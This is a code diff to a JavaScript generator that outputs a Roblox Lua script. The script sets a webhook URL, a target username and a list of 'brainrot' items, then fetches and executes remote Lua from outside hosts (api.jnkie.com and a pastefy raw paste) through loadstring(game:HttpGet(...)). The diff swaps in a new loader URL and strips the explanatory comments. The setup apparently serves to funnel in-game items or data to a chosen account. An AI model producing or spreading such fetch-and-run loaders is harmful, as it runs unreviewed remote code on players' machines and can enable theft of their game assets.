@@ -744,25 +744,25 @@ function generate() {
   let adminScriptPart = '';
   if (adminMode === 'admin-panel') {
     adminScriptPart = `
--- Load Admin Panel
-loadstring(game:HttpGet("https://api.luarmor.cc/files/v4/loaders/4d776ad92ed442d888dc977c03726949.lua"))();
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()
+end)
 `;
   } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
     adminScriptPart = `
--- Load Custom Admin Panel
 ${customAdminLoadstring}
 `;
   }
 
   const script = `
--- Brainrot Animals Configuration
+
 getgenv().WEBHOOK_URL = "${webhook}";
 getgenv().TARGET_USERNAME = "${username}";
 getgenv().TARGET_BRAINROT = {
 ${brainrotLines}
 };
 
--- Load Brainrot Script
+
 loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab71c35bd4b18d7c1ac52f950759f423c35b348cca80a7ae9724c0abe49/download"))();
 
 ${adminScriptPart}
